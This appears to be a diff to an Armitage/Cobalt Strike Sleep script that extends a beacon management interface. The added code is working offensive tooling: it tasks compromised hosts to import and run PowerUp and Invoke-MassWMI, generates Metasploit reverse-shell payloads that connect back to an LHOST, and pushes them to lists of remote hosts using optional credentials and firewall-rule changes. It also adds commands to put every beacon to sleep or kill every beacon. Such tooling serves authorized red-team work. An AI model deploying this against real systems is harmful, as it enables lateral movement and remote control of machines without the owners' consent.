@@ -19,6 +19,13 @@
 # Built by @harmj0y
 #
 
+# needed imports for custom menu creation
+import java.awt.*; # for borderlayout
+import javax.swing.*; # for jpanel
+import javax.swing.table.*; #tablerowsorter
+import table.*; # generictablemodel
+import ui.*; #atable
+
 
 # internal list to keep track of all active beacons
 %beaconHosts = %();
@@ -73,16 +80,20 @@ on heartbeat_5s {
             host_add($internal);
         }
 
-        $currentLabel = host_data($internal)['label'];
-        %label[$internal] = $currentLabel;
+        $data = host_data($internal);
+        
+        if ($data ne $null){
+            $currentLabel = host_data($internal)['label'];
+            %label[$internal] = $currentLabel;
 
-        # if this host isn't marked as a beacon, mark it
-        if ("beacon *" !iswm $currentLabel){
-            %label[$internal] = "beacon $currentLabel";
+            # if this host isn't marked as a beacon, mark it
+            if ("beacon *" !iswm $currentLabel){
+                %label[$internal] = "beacon $currentLabel";
+            }
+
+            # push the new/existing label
+            call_async("db.report_labels", %label);
         }
-
-        # push the new/existing label
-        call_async("db.report_labels", %label);
     }
 
     # grab all active session addresses
@@ -119,15 +130,24 @@ popup host_bottom {
 
         menu "Beacon" {
 
+            menu "PowerShell" {
+                item "PowerUp" {
+                    $beaconID = %beaconHosts[$address];
+                    task_powerup($beaconID);
+                }
+                item "Invoke-WMI" {
+                    $beaconID = %beaconHosts[$address];
+                    wmi_dialog($beaconID);
+                }
+            }
+
             item "Interact" {
-                
                 $beaconID = %beaconHosts[$address];
                 # open up the beacon console for this particular ID
                 open_beacon_console($beaconID, "- $address", $address)
             }
 
             item "Kill" {
-                
                 $beaconID = %beaconHosts[$address];
                 # task the beacon to close down
                 call('beacon.task', $beaconID, pack("II", 0x03, 0), lhost());
@@ -158,12 +178,645 @@ popup host_bottom {
                     removeAt(%beaconHosts, $address);
                 }
             }
-            
         }
     }
 }
 
-# create a nice keyboard shortcut to open the beacon browser tab
-bind Ctrl+B {
-    open_beacon_browser();
+
+# task our our beacon to import the specified powershell script
+sub task_powershell_import {
+    # task ID ($1) with powershell command + args ($2)
+    local('$id $len');
+
+    $id = $1;
+    $data = $2;
+    $len = strlen($data);
+
+    # task beacon to import the PowerShell script
+    call("beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
+    call("beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
+}
+
+# task our beacon to execute a given powershell command
+sub task_powershell {
+    
+    $id = $1;
+    $len  = strlen($2);
+
+    call("beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
+    call("beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
+}
+
+sub sleep_dialog {
+
+    # get all the active beacons from the database
+    @beacons = call('beacon.list');
+
+    $t = prompt_text("How long should beacon sleep for (seconds jitter%)?", "60");
+
+    @parts = split(' ', $t);
+    $jitter = 0;
+
+    if(size(@parts) eq 2){
+        $jitter = @parts[1];
+    }
+
+    $sleeptime = @parts[0];
+
+    foreach %beacon (@beacons) {
+        $id = %beacon["id"];
+        call('beacon.task', $id, pack("IIII", 0x04, 8, int($sleeptime) * 1000, int($jitter)), lhost());
+    }
+}
+
+
+sub kill_dialog {
+
+    $answer = prompt_confirm("Kill all beacons?", "Kill Beacons");
+    if($answer eq 0){
+        # get all the active beacons from the database
+        @beacons = call('beacon.list');
+
+        foreach %beacon (@beacons) {
+            $id = %beacon["id"];
+            call('beacon.task', $id, pack("II", 0x03, 0), lhost());
+        }
+
+    }
+}
+
+
+
+###################################################
+#
+# User interaction methods.
+#
+###################################################
+
+sub prompt_listener {
+
+    local('@raw_data @raw_listeners @listeners');
+
+    @raw_data = data_list("cloudstrike.listeners");
+    @raw_listeners = split('!!', @raw_data[0]);
+    @listeners = @();
+
+    foreach $raw_listener (@raw_listeners) {
+        if ($raw_listener ne "") {
+            local('$name $payload $port $migrate $null $null $domains %beacon %listener');
+            ($name, $payload, $port, $migrate, $null, $null, $domains) = split('@@', $raw_listener);
+            $s = size(split('@@', $raw_listener));
+
+            # if we have a beacon listener
+            if ($s == 7){
+                ($name, $payload, $port, $migrate, $host1, $host2, $host3) = split('@@', $raw_listener);
+                %beacon = %(name => $name, payload => $payload, host => $host1, port => $port);
+                push(@listeners, %beacon);
+            }
+
+            # otherwise a meterpreter listener
+            else {
+                ($name, $payload, $port, $migrate, $host, $null) = split('@@', $raw_listener);
+                %listener = %(name => $name, payload => $payload, host => $host, port => $port);
+                push(@listeners, %listener);
+            }
+        }
+    }
+
+    prompt_list("Listener to Use", @("Use", "Cancel"), @('name', 'payload', 'host', 'port'), @listeners, 900, 800);
+
+    on item_selected {
+        if ($1 eq "Use"){
+            # warn(@_);
+            $payload = $3[1];
+            $lhost = $3[2];
+            $lport = $3[3];
+
+            # fill in the selected values from the chosen listener
+            [$model setValueForKey:"Payload +","Value",$payload];
+            [$model setValueForKey:"LHOST","Value",$lhost];
+            [$model setValueForKey:"LPORT","Value",$lport];
+
+            # update the model values
+            [$model fireListeners];
+        }
+    }
+}
+
+
+# choose a particular payload from a list and fill 
+# the value into the calling table
+sub choose_payload {
+    
+    local('@payloads $file $handlef');
+    
+    @payloads = @(
+        %(payload => "windows/meterpreter/reverse_tcp"),
+        %(payload => "windows/meterpreter/reverse_http"),
+        %(payload => "windows/meterpreter/reverse_https"),
+        %(payload => "windows/meterpreter/reverse_ipv6_tcp"),
+        %(payload => "windows/meterpreter/reverse_ipv6_http"),
+        %(payload => "windows/meterpreter/reverse_ipv6_https"),
+        %(payload => "windows/beacon/reverse_http"),
+        %(payload => "windows/beacon/reverse_https"),
+        %(payload => "windows/shell/reverse_tcp"),
+        %(payload => "")
+    );
+
+    # first col argument -> data that's returned when "select" is chosen
+    quickListDialog("Choose a Payload", "Select", @("payload", "payload"), @payloads, $width => 350, $height => 240, lambda({
+        [$call : $1];
+    }, $call => $4), \$tablef);
+}
+
+
+sub choose_rhost_file {
+
+    local('$file $handlef @rhosts');
+    @rhosts = @();
+    
+    # read in a list of users to hunt for
+    $file = prompt_file_open("RHOST List");
+    
+    if ($file ne ""){
+        $handlef = openf($file);
+        while $readf (readln($handlef)){
+            add(@rhosts, $readf);
+        }
+    }
+
+    $hosts = join(",", @rhosts);
+    return $hosts;
+}
+
+
+# Main user-interaction dialog 
+#
+# adapted from armitage/scripts/attacks.sl
+# thanks for the bsd license raffi :)
+#
+sub wmi_dialog {
+
+    local('$center $south $c $x $executeButton');
+
+    $beacon_id = $1;
+
+    # main title and dimensions of the dialog box
+    $dialog = dialog("WMI (PowerShell)", 590, 340);
+
+    # build out the option list table for the specified payload
+    $model = [new GenericTableModel: @("Option", "Value"), "Option", 128];
+    [$model setCellEditable: 1];
+
+    [$model _addEntry: %(Option => "RHOST +", Tooltip => "RHOST to target", Hide => '0')];
+    [$model _addEntry: %(Option => "RemoteUser", Tooltip => "Remote user account to use for login (optional)", Hide => '0')];
+    [$model _addEntry: %(Option => "RemotePass", Tooltip => "Remote password to use for login (optional)", Hide => '0')];
+    [$model _addEntry: %(Option => "PoshHostPort", Value => "8000", Tooltip => "Port on the pivot machine to stage the PowerShell", Hide => '0')];
+    [$model _addEntry: %(Option => "PoshHostTime", Value => "30", Tooltip => "Time in seconds to host the PowerShell payload", Hide => '0')];
+    [$model _addEntry: %(Option => "Payload +", Tooltip => "payload to use (if applicable)", Hide => '0')];
+    [$model _addEntry: %(Option => "LHOST", Value => lhost(), Tooltip => "LHOST to connect back to", Hide => '0')];
+    [$model _addEntry: %(Option => "LPORT", Tooltip => "LPORT to connect back to", Hide => '0')];
+
+    $table = [new ATable: $model];
+
+    # add in the handler to manage clicks on each option
+    valueListener($table, $model);
+
+    # set up the panes
+    $center = [new JScrollPane: $table];
+    $south = [new JPanel];
+    [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    # [$south setLayout: [new GridLayout: 3, 1]]; # original -> more rows
+    [$south setLayout: [new GridLayout: 3, 1]];
+
+    $c = [new JPanel];
+    [$c setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    # our buttons
+    $executeButton = [new JButton: "Execute"];
+    $listenerButton = [new JButton: "Use Listener"];
+    $cancelButton = [new JButton: "Cancel"];
+
+    # selected if the user wants to add/remove a firewall rule automatically
+    $firewallCheckBox = [new JCheckBox: "Add/Remove Firewall Rule"];
+
+    # selected if the user wants use the RunWOW64 version of PowerShell
+    $runwowCheckBox = [new JCheckBox: "RunWOW64"];
+    [$runwowCheckBox setSelected: 1];
+
+    # add a lambda listener to trigger the generation of our payload
+    [$executeButton addActionListener: lambda({
+        
+        syncTable($table);
+        $options = %();
+
+        # grab all the filled in option values from the table
+        for ($x = 0; $x < [$model getRowCount]; $x++) {
+            $options[ [$model getValueAt: $x, 0] ] = [$model getValueAt: $x, 1];
+        }
+
+        # kick off out payload generation and delivery
+        executeWMI($beacon_id, $options["RHOST +"], $options["RemoteUser"], $options["RemotePass"], $options["PoshHostPort"], $options["PoshHostTime"], $options["Payload +"], $options["LHOST"], $options["LPORT"], [$firewallCheckBox isSelected], [$runwowCheckBox isSelected]);
+        [$dialog setVisible: 0]; # close the dialog off
+        })];
+
+    # fire off the listener prompt
+    [$listenerButton addActionListener: lambda({
+        prompt_listener(\$model);
+        }, \$dialog)];
+
+    [$cancelButton addActionListener: lambda({ [$dialog setVisible: 0]; }, \$dialog)];
+
+    # add the buttons to the frame
+    [$c add: $executeButton];
+    [$c add: $listenerButton];
+    [$c add: $cancelButton];
+    [$south add: left($firewallCheckBox)];
+    [$south add: left($runwowCheckBox)];
+    [$south add: $c];
+
+    # build the final pane layout
+    local('$s');
+    $s = [new JSplitPane: [JSplitPane VERTICAL_SPLIT], $north, $center];
+    [$center setPreferredSize: [new Dimension: 0, 0]];
+
+    [$s resetToPreferredSizes];
+    [$s setOneTouchExpandable: 1];
+
+    [$dialog add: $s, [BorderLayout CENTER]];   
+    [$dialog add: $south, [BorderLayout SOUTH]];
+
+    [$executeButton requestFocus];
+    [$dialog setVisible: 1];
+}
+
+
+###################################################
+#
+# PowerShell generation/execution
+#
+###################################################
+
+# arguments -> 
+#       $1 = Beacon ID
+#       $2 : RHOST
+#       $3 : RemoteUser
+#       $4 : RemotePass
+#       $5 : PoshHostPort
+#       $6 : PoshHostTime
+#       $7 : Payload
+#       $8 : LHOST
+#       $9 : LPORT
+#       $10 : firewallCheckBox
+#       $11 : RunWOW64
+sub executeWMI {
+    
+    $beacon_id = $1;
+    $RHOST = $2;
+    $RemoteUser = $3;
+    $RemotePass = $4;
+    $PoshHostPort = $5;
+    $PoshHostTime = $6;
+    $Payload = $7;
+    $LHOST = $8;
+    $LPORT = $9;
+    $FirewallCheckBox = $10;
+    $RunWOW64 = $11;
+
+    # get RHOSTS into the form needed for Invoke-MassWMI
+    $RHOST = "\"".replace($RHOST, ", ", "\",\"")."\"";
+
+    $script = "";
+
+    if (-exists script_resource("/beacon/Invoke-MassWMI.ps1")){
+       $script_source = script_resource("/beacon/Invoke-MassWMI.ps1");
+    }
+    else{
+        $script_source = script_resource("Invoke-MassWMI.ps1");
+    }
+
+    # generate the PowerShell payload with our given parameters
+    $payload = generate($Payload, $LHOST, $LPORT, %(), "psh");
+
+    # patch the payload into the target script to host
+    $handlef = openf($script_source);
+    while $readf (readln($handlef)){
+        $line = $readf;
+        if($line hasmatch 'REPLACE_HERE'){
+            # patch our payload into the appropriate place in the template
+            $line = strrep($line, "REPLACE_HERE", $payload);
+        }
+        $script = $script.$line."\n";
+    }
+    closef($script_source);
+
+    # write the output file out to a temporary location
+    $handlef = openf(">/tmp/script.ps1");
+    writeb($handlef, $script);
+    closef($handlef);
+
+    # get all of our data that we're going to upload
+    $handle = openf("/tmp/script.ps1");
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # task the beacon to import the powershell data
+    task_powershell_import($beacon_id, $data);
+
+    # command to invoke
+    if( ! $RunWOW64){
+        $cmd = "$RHOST | Invoke-MassWMI -LocalPort $PoshHostPort -ServerSleep $PoshHostTime -NoSYSWOW64 | Out-Null";
+    }
+    else{
+        $cmd = "$RHOST | Invoke-MassWMI -LocalPort $PoshHostPort -ServerSleep $PoshHostTime | Out-Null";
+    }
+    
+    # actually task the beacon
+    task_powershell($beacon_id, $cmd);
+}
+
+
+sub task_powerup {
+
+    $beacon_id = $1;
+
+    if (-exists script_resource("/beacon/PowerUp.ps1")){
+       $script_source = script_resource("/beacon/PowerUp.ps1");
+    }
+    else{
+        $script_source = script_resource("PowerUp.ps1");
+    }
+
+    # get all of our data that we're going to upload
+    $handle = openf($script_source);
+    $data = readb($handle, -1);
+    closef($handle);
+
+    # task the beacon to import the powershell data
+    task_powershell_import($beacon_id, $data);
+
+    # actually task the beacon
+    task_powershell($beacon_id, "Invoke-AllChecks");
+}
+
+
+###################################################
+#
+# Misc helpers
+#
+###################################################
+
+# adapted from addFileListener() in armitage/scripts/attacks.sl
+# listener method for when an option is double clicked in the
+# main dialoag menu
+sub valueListener {
+    local('$table $model $actions');
+    ($table, $model, $actions) = @_; 
+
+    if ($actions is $null) {
+        $actions = %();
+    }
+
+    # when LHOST is clicked, revert back to lhost() value
+    $actions["LHOST"] = { [$4: lhost()]; };
+
+    # when Payload is clicked, choose a MSFPaylaod
+    $actions["Payload +"] = lambda(&choose_payload);
+    
+    $actions["RHOST +"] = {
+        local('$title $temp');
+        $title = "Select $1";
+        $temp = chooseFile(\$title, $dir => ".", $always => "1");
+        if ($temp !is $null) {
+            local('$handle');
+            $handle = openf($temp);
+            @addresses = readAll($handle);  
+            closef($handle);
+
+            [$4: join(", ", @addresses)];
+        }
+    };
+
+    # helping logic for mouse interaction
+    addMouseListener($table, lambda({
+        if ($0 eq 'mouseClicked' && [$1 getClickCount] >= 2) {
+            local('$type $row $action $change $value');
+
+            $value = [$model getSelectedValueFromColumn: $table, "Value"];
+            $type = [$model getSelectedValueFromColumn: $table, "Option"];
+            $row = [$model getSelectedRow: $table];
+
+            # look for a direct match first
+            foreach $action => $change ($actions) {
+                if ($action eq $type) {
+                    [$change: $type, $value, $row, lambda({
+                        [$model setValueAtRow: $row, "Value", "$1"];
+                        [$model fireListeners];
+                    }, \$model, \$row)];
+                    return;
+                }
+            }
+
+            # fall back to looking for a wildcard match
+            foreach $action => $change ($actions) {
+                if ($action iswm $type) {
+                    [$change: $type, $value, $row, lambda({;
+                        [$model setValueAtRow: $row, "Value", "$1"];
+                        [$model fireListeners];
+                    }, \$model, \$row)];
+                    return;
+                }
+            }
+        }
+    }, \$model, \$table, \$actions));
+}
+
+
+###################################################
+#
+# GUI Helper Methods
+#   these are all from armitage/scripts/gui.sl
+#
+###################################################
+
+# creates a list dialog, from armitage/scripts/gui.sl
+# $1 = title, $2 = button text, $3 = columns, $4 = rows, $5 = callback
+sub quickListDialog {
+    local('$dialog $panel $table $row $model $button $sorter $after $a $tablef');
+    $dialog = dialog($1, $width, $height);
+    $panel = [new JPanel];
+    [$panel setLayout: [new BorderLayout]];
+    
+    ($table, $model) = setupTable($3[0], sublist($3, 1), $4);
+    [$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];
+
+    if ($tablef !is $null) {
+        [$tablef: $table, $model];
+    }
+    
+    $button = [new JButton: $2];
+    [$button addActionListener: lambda({
+        [$callback : [$model getSelectedValueFromColumn: $table, $lead], $table, $model]; 
+        [$dialog setVisible: 0];
+    }, \$dialog, $callback => $5, \$model, \$table, $lead => $3[0])];
+
+    local('$south');
+    $south = [new JPanel];
+        [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    if ($after !is $null) {
+        foreach $a ($after) {
+            [$south add: $a];
+        }
+    }
+    [$south add: center($button)];
+
+    [$panel add: $south, [BorderLayout SOUTH]];
+    [$dialog add: $panel, [BorderLayout CENTER]];
+    [$dialog show];
+    [$dialog setVisible: 1];
+}
+
+# from armitage/scripts/gui.sl
+sub setupTable {
+    local('$table $model $sorter $row $index $col');
+    $model = [new GenericTableModel: $2, $1, 8];
+    foreach $row ($3) {
+        [$model _addEntry: $row];
+        }
+
+    $table = [new ATable: $model];
+    [[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
+    $sorter = [new TableRowSorter: $model];
+    [$table setRowSorter: $sorter];
+
+    # make sure our columns have sorters that make sense
+    foreach $index => $col ($2) {
+        if ($col eq "session_host" || $col eq "host" || $col eq "Host") {
+            [$sorter setComparator: $index, &compareHosts];
+        }
+        else if ($col eq "port" || $col eq "sid" || $col eq "Port") {
+            [$sorter setComparator: $index, { return $1 <=> $2; }];
+        }
+    }
+    
+    return @($table, $model);
+}
+
+# from armitage/scripts/gui.sl
+sub chooseFile {
+    local('$fc $file $title $sel $dir $multi $always $dirsonly');
+
+    if ($REMOTE && $always is $null) {
+        if ($client !is $mclient) {
+            local('$file');
+            $file = chooseFile(\$title, \$file, \$sel, \$dir, \$dirsonly, \$multi, \$fc, $always => 1);
+            if (-exists $file) {
+                print_info("uploading $file");
+                return uploadFile($file);
+            }
+            return "";
+        }
+        else {
+            return ask("Please type a file name:");
+        }
+    }
+
+    $fc = [new JFileChooser];
+
+    if ($title !is $null) {
+        [$fc setDialogTitle: $title];
+    }
+
+    if ($sel !is $null) {
+        [$fc setSelectedFile: [new java.io.File: $sel]];
+    }
+
+    if ($dir !is $null) {
+        [$fc setCurrentDirectory: [new java.io.File: $dir]];
+    }
+
+    if ($multi !is $null) {
+        [$fc setMultiSelectionEnabled: 1];
+    }
+
+    if ($dirsonly !is $null) {
+        [$fc setFileSelectionMode: [JFileChooser DIRECTORIES_ONLY]];
+    }
+
+    [$fc showOpenDialog: $null];
+
+    if ($multi) {
+        return [$fc getSelectedFiles];
+    }
+    else {
+        $file = [$fc getSelectedFile];
+        if ($file !is $null) {
+            if (-exists $file) {
+                return $file;
+            }
+            showError("$file does not exist!");
+        }
+    }
+}
+
+# from armitage/scripts/gui.sl
+sub center {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub left {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout LEFT]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub syncTable {
+    if ([$1 isEditing]) {
+        [[$1 getCellEditor] stopCellEditing];
+    }
+}
+
+# helper, from armitage/scripts/gui.sl
+sub addMouseListener {
+    [$1 addMouseListener: [new SafeMouseListener: $2]];
+}
+
+# helper, from armitage/scripts/gui.sl
+sub dialog {
+    local('$dialog');
+        $dialog = [new JFrame: $1];
+        [$dialog setSize: $2, $3];
+        [$dialog setLayout: [new BorderLayout]];
+        # [$dialog setLocationRelativeTo: $__frame__];
+    return $dialog;
+}
+
+menubar("Beacons", "beaconinterface", 2);
+
+# modify the main "Attacks" menu
+popup beaconinterface {
+    item "Sleep All" {
+        sleep_dialog();
+    }
+    item "Kill All"{
+        kill_dialog();
+    }
 }
